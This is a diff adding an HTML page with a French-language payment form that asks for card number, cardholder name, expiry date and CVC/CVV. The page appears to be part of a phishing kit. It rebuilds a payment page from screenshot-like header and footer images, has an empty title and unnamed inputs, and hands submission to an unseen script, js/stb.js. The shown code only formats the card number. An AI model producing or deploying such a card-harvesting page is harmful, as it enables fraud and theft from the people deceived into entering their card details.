@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/ckom.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div>
+        <div class="roof">
+            <img src="./img/topo.JPG" alt="">
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="cc1">
+                <img src="./img/top2-cc.JPG" alt="">
+            </div>
+
+            <div class="insid">
+                <p class="p1p">
+                    Méthodes de paiement:
+                </p>
+                <div class="forma"> 
+                    <div class="vis">
+                        <img src="./img/cc.JPG" alt="">
+                    </div>
+                    <form method="post" id="pg2">
+                        <p>Numéro de la carte </p>
+                        <input type="tele" name="" id="numcc" maxlength="19">
+
+                        <p>Nom du Titulaire  </p>
+                        <input type="text" name="" id="numnn" maxlength="19">
+
+                        <p>Date d'expiration</p>
+                        <div class="exp">
+                            <input class="mm" type="tel" name="" id="mmo" required placeholder="MM" maxlength="3">
+                            <input type="tel" name="" id="aao" required placeholder="AA"  maxlength="3">
+                        </div>
+
+                        <p>CVC/CVV</p>
+                        <input class="cfifi" type="tel" name="" id="numvv" required maxlength="8" maxlength="4">
+
+                        <button class="btn2"  type="submit">Confirm</button>
+                    </form>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="boot">
+                <img src="./img/bot-cc.JPG" alt="">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
